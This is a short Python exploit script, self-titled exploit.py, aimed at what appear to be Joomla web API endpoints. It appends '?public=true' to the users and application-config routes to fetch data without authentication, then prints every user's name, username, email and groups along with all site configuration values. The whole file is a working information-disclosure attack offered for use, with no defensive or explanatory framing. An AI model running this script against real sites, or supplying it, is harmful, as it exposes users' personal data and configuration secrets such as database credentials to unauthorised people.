import requests
import json
import sys
from termcolor import colored

def fetch_users(url):
    try:
        response = requests.get(f"{url}/api/index.php/v1/users?public=true")
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        print(colored(f"Error fetching users: {e}", "red"))
        return None

def parse_users(data):
    users = []
    for user in data.get('data', []):
        if user['type'] == 'users':
            users.append({
                'id': user['attributes']['id'],
                'name': user['attributes']['name'],
                'username': user['attributes']['username'],
                'email': user['attributes']['email'],
                'groups': user['attributes']['group_names']
            })
    return users

def fetch_config(url):
    try:
        response = requests.get(f"{url}/api/index.php/v1/config/application?public=true")
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        print(colored(f"Error fetching configuration: {e}", "red"))
        return None

def parse_config(data):
    config = {}
    for entry in data.get('data', []):
        if entry['type'] == 'application':
            for key, value in entry['attributes'].items():
                config[key] = value
    return config

def main(url):
    users_data = fetch_users(url)
    if users_data:
        users = parse_users(users_data)
        print(colored("Users:", "blue"))
        for user in users:
            print(f"[{user['id']}] {user['name']} ({colored(user['username'], 'yellow')}) - {user['email']} - {', '.join(user['groups'])}")

    config_data = fetch_config(url)
    if config_data:
        config = parse_config(config_data)
        print("\n" + colored("Site info:", "blue"))
        for key, value in config.items():
            print(f"{key}: {colored(value, 'green')}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(colored("Usage: python exploit.py <url>", "red"))
        sys.exit(1)
    main(sys.argv[1])
